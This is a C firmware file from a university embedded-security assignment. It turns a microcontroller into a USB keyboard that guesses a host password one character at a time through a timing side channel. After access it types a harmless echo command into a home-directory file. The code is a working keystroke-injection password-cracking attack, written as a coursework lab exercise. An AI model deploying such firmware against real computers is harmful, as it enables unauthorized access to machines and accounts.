/******************************************************************************
 * Copyright (C) 2018 by Alperen Gündogan(ga53keb) - Technical University of Munich
 * 
 * Deliverable 4 "HIDe your password?" of Embedded System and Security
 *
 *********************************************************************************/

/*
 * This code is used to find user password using timing side channel attack.
 * Function compares the time of the correct character and wrong character of the password
 * Then decided the correct character and iterate it for the rest of the characters.
 * @author Alperen Gündogan
 * @date 30.01.2018
 *
*/

#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0
#define TICKS_PER_SECOND 100000
static volatile uint32_t ticks;

/*
 * @brief this function is called in every tick to count the time  
 * This function is used to determine the current time of the program in ms.
*/
void SysTick_Handler(void)
{
	ticks++;
}
/* 
 * @brief this is used to return the current number of ticks.
 * @return The current number of ticks
*/
static volatile uint32_t millis(void)
{
	return ticks;
}

/* 
 * @brief This function takes the desired delay time in milisecond
 * This is used to fix the on/off status time of LED1.
 * @param t takes the volatile unsigned long to fix the delay time of the program
*/
void delay (volatile unsigned long t)
{
 	uint32_t start, end;
	start = millis();
	end = start + t;
  	if (start < end)
	{ 
    	while ((millis() >= start) && (millis() < end)) 
		{ 
     		 // do nothing 
  		} 
  	}
	else 
	{ 
    	while ((millis() >= start) || (millis() < end)) 
		{
    	  	// do nothing
   		};
  	}
}

/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

static uint8_t possible_keys[49] = {
    GERMAN_KEYBOARD_SC_A,
    GERMAN_KEYBOARD_SC_B,
    GERMAN_KEYBOARD_SC_C,
    GERMAN_KEYBOARD_SC_D,
    GERMAN_KEYBOARD_SC_E,
    GERMAN_KEYBOARD_SC_F,
    GERMAN_KEYBOARD_SC_G,
    GERMAN_KEYBOARD_SC_H,
    GERMAN_KEYBOARD_SC_I,
    GERMAN_KEYBOARD_SC_J,
    GERMAN_KEYBOARD_SC_K,
    GERMAN_KEYBOARD_SC_L,
    GERMAN_KEYBOARD_SC_M,
    GERMAN_KEYBOARD_SC_N,
    GERMAN_KEYBOARD_SC_O,
    GERMAN_KEYBOARD_SC_P,
    GERMAN_KEYBOARD_SC_Q,
    GERMAN_KEYBOARD_SC_R,
    GERMAN_KEYBOARD_SC_S,
    GERMAN_KEYBOARD_SC_T,
    GERMAN_KEYBOARD_SC_U,
    GERMAN_KEYBOARD_SC_V,
    GERMAN_KEYBOARD_SC_W,
    GERMAN_KEYBOARD_SC_X,
    GERMAN_KEYBOARD_SC_Y,
    GERMAN_KEYBOARD_SC_Z,
    GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, //26
    GERMAN_KEYBOARD_SC_2_AND_QUOTES,                    
    GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,                
    GERMAN_KEYBOARD_SC_4_AND_DOLLAR,                      
    GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,                  
    GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,                       
    GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, //32, index 76              
    GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 
    GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 
    GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, //35
    GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, //36 , 
    GERMAN_KEYBOARD_SC_CARET_AND_DEGREE,  
    GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 
    GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE, //39 , 82
    GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, //40
    GERMAN_KEYBOARD_SC_DOT_AND_COLON,  // 41 , 
    GERMAN_KEYBOARD_SC_ENTER,                             
    GERMAN_KEYBOARD_SC_ESCAPE,                            
    GERMAN_KEYBOARD_SC_BACKSPACE,                         
    GERMAN_KEYBOARD_SC_TAB,                               
    GERMAN_KEYBOARD_SC_SPACE,                             
    GERMAN_KEYBOARD_SC_HASHMARK_AND_APOSTROPHE,   //burasi yok
    GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, //pipe yok
};


static uint8_t text_command[41] = { //writes "echo  "Alperen Gundogan" > $HOME/0369456"
    GERMAN_KEYBOARD_SC_E, //0
    GERMAN_KEYBOARD_SC_C,
    GERMAN_KEYBOARD_SC_H,
    GERMAN_KEYBOARD_SC_O, 
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_2_AND_QUOTES, //with shift
    GERMAN_KEYBOARD_SC_A, //6
    GERMAN_KEYBOARD_SC_L,
    GERMAN_KEYBOARD_SC_P,
    GERMAN_KEYBOARD_SC_E,
    GERMAN_KEYBOARD_SC_R,
    GERMAN_KEYBOARD_SC_E,
    GERMAN_KEYBOARD_SC_N,
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_G,
    GERMAN_KEYBOARD_SC_U,
    GERMAN_KEYBOARD_SC_N,
    GERMAN_KEYBOARD_SC_D,
    GERMAN_KEYBOARD_SC_O,
    GERMAN_KEYBOARD_SC_G,
    GERMAN_KEYBOARD_SC_A,
    GERMAN_KEYBOARD_SC_N, //21
    GERMAN_KEYBOARD_SC_2_AND_QUOTES, //with shift , 22   
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, //with shift
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_4_AND_DOLLAR, //with shift .26
    GERMAN_KEYBOARD_SC_H, //with shift
    GERMAN_KEYBOARD_SC_O, //with shift
    GERMAN_KEYBOARD_SC_M, //with shift
    GERMAN_KEYBOARD_SC_E, //with shift
    GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, //with shift 31
    GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
    GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
    GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
    GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
    GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
    GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,
    GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
    GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,
    GERMAN_KEYBOARD_SC_ENTER,//40
};

/* 
 * @brief Clears the char times.
*/
void clear_char_times();
/* 
 * @brief create a text written after breaking the password.
 * @param take the "report" as an input. 
*/
void create_text_file(USB_KeyboardReport_Data_t* report);
/* 
 * @brief This function turns off the capslock in order to write the following command into the screen.
 * @param t takes USB_KeyboardReport_Data_t* report adress to create a report.
*/
void turn_off_capslock(USB_KeyboardReport_Data_t* report);
/* 
 * @brief sends the correct password using the location inside the correct_password[] array.
 * @param take the "report" as an input. .
*/
void found_char(USB_KeyboardReport_Data_t* report);
/* 
 * @brief This function first sends the found correct char then iterate it to find next correct char.
 * General description of the algorithm: The idea is when you create a report which can be a character
 * or only modifier(shift, alt) or both, then you need to release it and 
 * you have to press enter to send the given character to the computer. Before sending next character, you should release the enter
 * So, the process includes several steps which can be done by using flags. I have used separate functions(alt_key, press_key,.. etc)
 * Because the HID protocol of the MACos is different than linux protocol, this code can be applied to MACos machine with
 * couple changes. I manually decided the all combinations using if clause. This can be also by using converter function.
*/
void send_password(USB_KeyboardReport_Data_t* report, uint8_t correct_char);
/* 
 * @brief puts the given time into an array. 
 * @param "verify_time" control times of the characters.
*/
void check_char(uint32_t verify_time);
/* 
 * @brief finds the highest time among char_times.
 * @return the location the of highest time. 
*/
uint8_t find_highest_time();
/* 
 * @brief press and release the key.
 * First press the character using press_key(report)
 * then set characterSent to true and release the key.
 * @param take the "report" as an input. 
*/
void normal_key(USB_KeyboardReport_Data_t* report);
/* 
 * @brief press and release the key.
 * First press the character using press_shift_key(report)
 * then set characterSent to true and release the key.
 * @param take the "report" as an input. 
*/
void shift_key(USB_KeyboardReport_Data_t* report);
/* 
 * @brief press and release the key.
 * First press the character using press_ralt_key(report)
 * then set characterSent to true and release the key.
 * @param take the "report" as an input. 
*/
void alt_key(USB_KeyboardReport_Data_t* report);
/* 
 * @brief press enter.
 * @param take the "report" as an input. 
*/
void press_enter(USB_KeyboardReport_Data_t* report);
/* 
 * @brief release key.
 * @param take the "report" as an input. 
*/
void release_key(USB_KeyboardReport_Data_t* report);
/* 
 * @brief press given key without modifier.
 * @param take the "report" as an input. 
 * @param "key" to used in KeyCode.
*/
void press_key(USB_KeyboardReport_Data_t* report, uint8_t key);
/* 
 * @brief press given key with shift modifier.
 * @param take the "report" as an input. 
 * @param "key" to used in KeyCode.
*/
void press_shift_key(USB_KeyboardReport_Data_t* report, uint8_t key);
/* 
 * @brief press given key with right alt modifier.
 * @param take the "report" as an input. 
 * @param "key" to used in KeyCode.
*/
void press_ralt_key(USB_KeyboardReport_Data_t* report, uint8_t key);
/* 
 * @brief sends the character without modifier.
 * First press the character using normal_key(report)
 * then press enter and set the press_enter_flag and send_next_char_flag to false.
 * @param take the "report" as an input. 
*/
void sending_process_normal(USB_KeyboardReport_Data_t* report);
/* 
 * @brief sends the character with shift modifier.
 * First press the character using shift(report)
 * then press enter and set the press_enter_flag and send_next_char_flag to false.
 * @param take the "report" as an input. 
*/
void sending_process_lshift(USB_KeyboardReport_Data_t* report);
/* 
 * @brief sends the character with right alt modifier.
 * First press the character using alt_key(report)
 * then press enter and set the press_enter_flag and send_next_char_flag to false.
 * @param take the "report" as an input. 
*/
void sending_process_ralt(USB_KeyboardReport_Data_t* report);
/* 
 * @brief used to iterate the password .
 * @param take the "report" as an input. 
*/
void send_report(USB_KeyboardReport_Data_t* report);
/* 
 * @brief this function can be used to generate a key from given index.
 * @param "index" to used to generate key. 
*/
uint8_t select_char(uint8_t index);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	SysTick_Config(SystemCoreClock / TICKS_PER_SECOND);
	
	// Wait until host has enumerated HID device
	delay(100000);
        
	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}
static uint8_t characterSent = 0, 
                indexToSend = 0;
static uint8_t times_to_send = 0; //to control how many times same character should send to ensure correct data guess.
static uint8_t send_times_to_send = 0;
static uint8_t send_three_times = 0;
static uint32_t char_times[84]; // it will initialize to 0 directly
static uint8_t correct_password[20];

static uint32_t press_enter_flag = false;
static bool send_next_char_flag = true;
static bool capslock_on = false;
static bool send_command = false;
static uint8_t command_to_send = 0;

/* 
 * @brief this function creates HID report. 
 * I have modified this function to using flags 
*/
// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
        

        if(send_next_char_flag)
        {           
            if(indexToSend == 84)
            {
                correct_password[times_to_send] = find_highest_time();
                clear_char_times();
                ++times_to_send;
                indexToSend = 0;
            }
            else
            {
                send_password(report,times_to_send);
            }
        }
        if(capslock_on)
        {
            turn_off_capslock(report);
            delay(50000); // wait for some time to turn off the capslock. 
	}
	
	if(send_command) // send command become true when we are in the system.
        {
            delay(500);
            create_text_file(report);
        }
        
	return true;
}


// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

        
	if(*report & HID_KEYBOARD_LED_NUMLOCK) 
        {
            XMC_GPIO_SetOutputHigh(LED1);
            send_next_char_flag = true;
            check_char(millis());
        }
	else
        {
            XMC_GPIO_SetOutputLow(LED1);
            send_next_char_flag = false;
            ticks=0;

        }
	if(*report & HID_KEYBOARD_LED_CAPSLOCK)
        {
            XMC_GPIO_SetOutputHigh(LED2);
            capslock_on = true;
        }
        else 
            XMC_GPIO_SetOutputLow(LED2);
}



void turn_off_capslock(USB_KeyboardReport_Data_t* report)
{
    	if(characterSent) 
	{			
            report->Modifier = 0;
            report->Reserved = 0; 
            report->KeyCode[0] = 0;
            characterSent = 0;
            capslock_on = false;
            send_command = true;
	}
	else
	{
            report->Modifier = 0;
            report->Reserved = 0; 
            report->KeyCode[0] = HID_KEYBOARD_SC_CAPS_LOCK;
            characterSent = 1;
	}    
}


void send_password(USB_KeyboardReport_Data_t* report, uint8_t correct_char)
{
    if(send_times_to_send < correct_char)
    {
        if(characterSent) 
	      {			
		      release_key(report);
		      characterSent = 0;
          ++send_times_to_send;
	      }
	      else
	      {
		      found_char(report);
		      characterSent = 1;
	      }
    }
    else
    {
        send_report(report);
    }  
}


void check_char(uint32_t verify_time)
{
    if(send_three_times - 1 == 0)
    {
        char_times[indexToSend] = verify_time;
    }
    else
    {
        if(verify_time < char_times[indexToSend])
        {
            char_times[indexToSend] = verify_time;
        }
    }
}


uint8_t find_highest_time()
{
    uint32_t max_time = 0;
    uint8_t location = 0;
    for(int i = 0; i < 84 ;i++)
    {
        if(char_times[i] > max_time)
        {
            max_time = char_times[i];
            location = i;
        }
    }
    
    return location;
}

void sending_process_normal(USB_KeyboardReport_Data_t* report)
{
    if(send_three_times<1)
    {
        if(!press_enter_flag)
        {
            normal_key(report);
        }
        else
        {
            press_enter(report);
            press_enter_flag = false;
            send_next_char_flag = false;
            send_times_to_send = 0;
            ++send_three_times;
        }
    }
    else
    {
        send_three_times = 0;
        ++indexToSend;        
    }
}

void sending_process_lshift(USB_KeyboardReport_Data_t* report)
{
    if(send_three_times<1)
    {
        if(!press_enter_flag)
        {
            shift_key(report);
        }
        else
        {
            
            press_enter_flag = false;
            send_next_char_flag = false;
            send_times_to_send = 0;
            ++send_three_times;
            press_enter(report);
        }
    }
    else
    {
        send_three_times = 0;
        ++indexToSend;
    }
}


void sending_process_ralt(USB_KeyboardReport_Data_t* report)
{
    if(send_three_times<1)
    {
        if(!press_enter_flag)
        {
            alt_key(report);
            //press_enter_flag = true;
        }
        else
        {
            press_enter(report);
            press_enter_flag = false;
            send_next_char_flag = false;
            send_times_to_send = 0;
            ++send_three_times;
        }
    }
    else
    {
        send_three_times = 0;
        ++indexToSend;
        
    }
}

void normal_key(USB_KeyboardReport_Data_t* report)
{
	if(characterSent) 
	{			
		release_key(report);
		characterSent = 0;
		press_enter_flag = true;		
	}
	else
	{
		press_key(report, select_char(indexToSend));
		characterSent = 1;
	}
}

void shift_key(USB_KeyboardReport_Data_t* report)
{
	if(characterSent) 
	{			
		characterSent = 0;
    release_key(report);
		press_enter_flag = true;
                
	}
	else
	{
		press_shift_key(report, select_char(indexToSend));
		characterSent = 1;
	}
}

void alt_key(USB_KeyboardReport_Data_t* report)
{
	if(characterSent) 
	{			
		release_key(report);
		characterSent = 0; 
                //++indexToSend; 
		press_enter_flag = true;		
	}
	else
	{
		press_ralt_key(report, select_char(indexToSend));
		characterSent = 1;
	}
}


void press_enter(USB_KeyboardReport_Data_t* report)
{
	report->Modifier = 0;
	report->Reserved = 0;
	report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
    
}

void release_key(USB_KeyboardReport_Data_t* report)
{
	report->Modifier = 0;
	report->Reserved = 0; 
	report->KeyCode[0] = 0;
}


void press_key(USB_KeyboardReport_Data_t* report, uint8_t key)
{
	report->Modifier = 0;
	report->Reserved = 0;
	report->KeyCode[0] = key;
}


void press_shift_key(USB_KeyboardReport_Data_t* report, uint8_t key)
{
	report->Modifier = 0x02;
	report->Reserved = 0;
	report->KeyCode[0] = key;
}

void press_ralt_key(USB_KeyboardReport_Data_t* report, uint8_t key)
{
	report->Modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
	report->Reserved = 0;
	report->KeyCode[0] = key;
}

void create_text_file(USB_KeyboardReport_Data_t* report)
{
    if(command_to_send < 5 || command_to_send == 23 || command_to_send==25 )
    {
        if(characterSent) 
	{			
		release_key(report);
		characterSent = 0;
                ++command_to_send; 		
	}
	else
	{
		press_key(report,text_command[command_to_send]);
		characterSent = 1;
        }
    }
    if(command_to_send == 5)
    {
 	if(characterSent) 
	{			
		release_key(report);
		characterSent = 0; 
                ++command_to_send;		
	}
	else
	{
		press_shift_key(report, text_command[command_to_send]);
		characterSent = 1;
	}       
    }
    if(command_to_send >=6 && command_to_send < 22 )
    {
 	if(characterSent) 
	{			
		release_key(report);
		characterSent = 0; 
                ++command_to_send;		
	}
	else
	{
		press_key(report,text_command[command_to_send]);
		characterSent = 1;
	}       
    }
    if(command_to_send == 22 || command_to_send ==24)
    {
        if(characterSent) 
	{			
		release_key(report);
		characterSent = 0;
                ++command_to_send; 		
	}
	else
	{
		press_shift_key(report,text_command[command_to_send]);
		characterSent = 1;
        }
    }
    if(command_to_send > 25 && command_to_send < 32 )
    {
        if(characterSent) 
	{			
		release_key(report);
		characterSent = 0;
                ++command_to_send; 		
	}
	else
	{
		press_shift_key(report,text_command[command_to_send]);
		characterSent = 1;
        }
    }
    if(command_to_send > 31 && command_to_send < 41)
    {
        if(characterSent) 
	{			
		release_key(report);
		characterSent = 0;
                ++command_to_send; 		
	}
	else
	{
		press_key(report,text_command[command_to_send]);
		characterSent = 1;
        }
    }
}


void clear_char_times()
{
    for(int i = 0; i<84;i++)
    {
        char_times[i] = 0;   
    }
}

void found_char(USB_KeyboardReport_Data_t* report)
{
        
	if(correct_password[send_times_to_send]<26)
	{
		press_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send]>=26 && correct_password[send_times_to_send] < 52)
	{
		press_shift_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send]>=52 && correct_password[send_times_to_send] < 62)
	{
		press_key(report, select_char(correct_password[send_times_to_send]));
	}  
	else if(correct_password[send_times_to_send] >=62 && correct_password[send_times_to_send] < 65)
	{
		press_shift_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send] == 65)
	{
		press_key(report, select_char(correct_password[send_times_to_send]));
	}
        else if(correct_password[send_times_to_send] == 66)
	{
		press_ralt_key(report, select_char(correct_password[send_times_to_send]));
	}
        else if(correct_password[send_times_to_send] == 67)
	{
		press_key(report, select_char(correct_password[send_times_to_send]));
	}
        else if(correct_password[send_times_to_send] == 68)
	{
		press_shift_key(report, select_char(correct_password[send_times_to_send]));
	}
        else if(correct_password[send_times_to_send] == 69)
	{
		press_ralt_key(report, select_char(correct_password[send_times_to_send]));
	}	
        else if(correct_password[send_times_to_send] == 70 || correct_password[send_times_to_send] == 70)
	{
		press_shift_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send]> 71  && correct_password[send_times_to_send]< 75)
	{
		press_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send]==75)
	{
		press_shift_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send] > 75  && correct_password[send_times_to_send] < 80)
	{
		press_ralt_key(report, select_char(correct_password[send_times_to_send]));
	}
	else if(correct_password[send_times_to_send] >= 80  && correct_password[send_times_to_send] < 84)
	{
		press_shift_key(report, select_char(correct_password[send_times_to_send]));
	}
}


void send_report(USB_KeyboardReport_Data_t* report)
{

	if(indexToSend < 26)
	{
		sending_process_normal(report);	//LOWER cASE CHARACTER	
	}
	else if((indexToSend >= 26) && (indexToSend<52))
	{
		sending_process_lshift(report);	   //upper case character
	}
	else if((indexToSend >= 52) && (indexToSend<62))
	{
		sending_process_normal(report);  //numbers
	}	
	else if((indexToSend >= 62) && (indexToSend<65))       // shift signs
	{
                sending_process_lshift(report);	
	}
	else if(indexToSend == 65)   //normal sign
 	{
		sending_process_normal(report);  
	}
	else if(indexToSend == 66)  //ralt char
	{
		sending_process_ralt(report); // _
	}
	else if(indexToSend == 67)  //normal
	{
		sending_process_normal(report);  // + 
	}
	else if(indexToSend==68) //shift
	{
		sending_process_lshift(report);	 // =
	}
	else if(indexToSend==69) // alt
	{
		sending_process_ralt(report); // ~
	}
        else if((indexToSend == 70) || (indexToSend == 71))  //shift
	{
		 sending_process_lshift(report);	
	}
	else if((indexToSend > 71) && (indexToSend <75))  //normal
	{
                sending_process_normal(report);  
        }
        else if(indexToSend==75) // shift
        {
                sending_process_lshift(report);	 // =
        }
        else if(indexToSend > 75 && indexToSend < 80)  //alt
        {
                sending_process_ralt(report); 
        }
        else if(indexToSend >= 80 && indexToSend < 84)  //shift
        {
                sending_process_lshift(report);	
        }
}


uint8_t select_char(uint8_t index)
{
	uint8_t key;
	if(index < 26)
	{
		key = possible_keys[index];	//LOWER cASE CHARACTER	
	}
	else if((index >= 26) && (index<52))
	{
		key = possible_keys[index%26];    //upper case character
	}
	else if((index >= 52) && (index<62))
	{
		key = possible_keys[index-26];   //numbers
	}	
	else if((index >= 62) && (index<65))       // shift signs
	{
                if(index == 62) {key = GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;} // !
                if(index == 63) {key = GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;} // (
                if(index == 64) {key = GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;} // )
	}
	else if(index == 65)   //normal sign
 	{
		key = GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE; //-
	}
	else if(index == 66)  //ralt char
	{
		key = GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE; // _
	}
	else if(index == 67)  //normal
	{
		key = GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE; // + 
	}
	else if(index==68) //shift
	{
		key = GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE; // =
	}
	else if(index==69) // alt
	{
		key = GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE; // ~
	}
        else if(index == 70 || index == 71)  //shift
	{
		if(index == 70) {key = GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;} //;
                if(index == 71) {key = GERMAN_KEYBOARD_SC_DOT_AND_COLON;} // :
	}
	else if(index > 71 && index <75)  //normal
	{
		if(index == 72) {key = GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;} //,
                if(index == 73) {key = GERMAN_KEYBOARD_SC_DOT_AND_COLON;} // .
                if(index == 74) {key = GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;} // <
	}
	else if(index==75) // shift
	{
		key = GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE; // =
	}
	else if(index > 75 && index < 80)  //alt
	{
		if(index == 76) {key = GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;} // [
                if(index == 77) {key = GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;} // ]
                if(index == 78) {key = GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;} // <
                if(index == 79) {key = GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;} //,
	}
        else if(index >= 80 && index <84)  //shift
	{
		if(index == 80) {key = GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;} // [
                if(index == 81) {key = GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH;} // ]
                if(index == 82) {key = GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;} // <
                if(index == 83) {key = GERMAN_KEYBOARD_SC_4_AND_DOLLAR;} //,
	}
	
	return key;    
}


void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}
